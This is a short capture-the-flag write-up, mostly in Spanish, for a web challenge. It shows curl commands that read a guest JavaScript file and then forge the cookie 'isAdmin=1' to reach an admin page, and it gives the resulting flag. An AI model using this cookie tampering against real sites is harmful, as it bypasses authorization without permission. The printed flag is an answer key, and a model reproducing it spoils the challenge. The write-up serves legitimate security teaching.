## Descripción
Can you get the flag? Go to this website and see what you can discover.

[http://xebec.cylabacademy.net:41980/](http://xebec.cylabacademy.net:41980/)

1.- Do you know how to modify cookies?
## Solución
```

curl -s http://xebec.cylabacademy.net:41980/guest.js

El JavaScript manda al usuario a check.php y asigna la cookie de invitado:

function continueAsGuest()
{
  window.location.href = '/check.php';
  document.cookie = "isAdmin=0";
}

Modifiqué la cookie para entrar como administrador:

curl -s http://xebec.cylabacademy.net:41980/check.php -H "Cookie: isAdmin=1"

El servidor respondió con la bandera:

academy{gr4d3_A_c00k13_6cf86b5a}
```
```

```

## Notas Adicionales

## Referencias
[http://xebec.cylabacademy.net:41980/](http://xebec.cylabacademy.net:41980/)
[http://xebec.cylabacademy.net:41980/guest.js]
(http://xebec.cylabacademy.net:41980/guest.js)
 [http://xebec.cylabacademy.net:41980/check.php](http://xebec.cylabacademy.net:41980/check.php)
